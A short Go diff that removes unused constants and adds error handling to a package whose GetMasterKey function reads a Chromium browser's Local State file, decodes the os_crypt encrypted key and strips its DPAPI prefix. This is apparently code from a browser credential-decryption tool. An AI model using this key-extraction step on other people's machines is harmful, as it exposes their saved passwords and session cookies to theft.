@@ -1,4 +1,5 @@
 package functions
+
 import (
 	"bytes"
 	"crypto/aes"
@@ -14,13 +15,6 @@ import (
 	"unsafe"
 )
 
-const (
-	salt        = "CHUJ"
-	keySize     = 32
-	iteration   = 65536
-	ivSize      = aes.BlockSize
-	paddingSize = 16
-)
 
 func EncryptData(data []byte, master string) ([]byte, error) {
 	block, err := aes.NewCipher([]byte(master))
@@ -135,6 +129,9 @@ func GetMasterKey(localStatePath string) ([]byte, error) {
 	_ = json.Unmarshal(byteValue, &result)
 	roughKey := result["os_crypt"].(map[string]interface{})["encrypted_key"].(string)
 	decodedKey, err := base64.StdEncoding.DecodeString(roughKey)
+	if err != nil {
+		return nil, err
+	}
 	stringKey := string(decodedKey)
 	stringKey = strings.Trim(stringKey, "DPAPI")
 
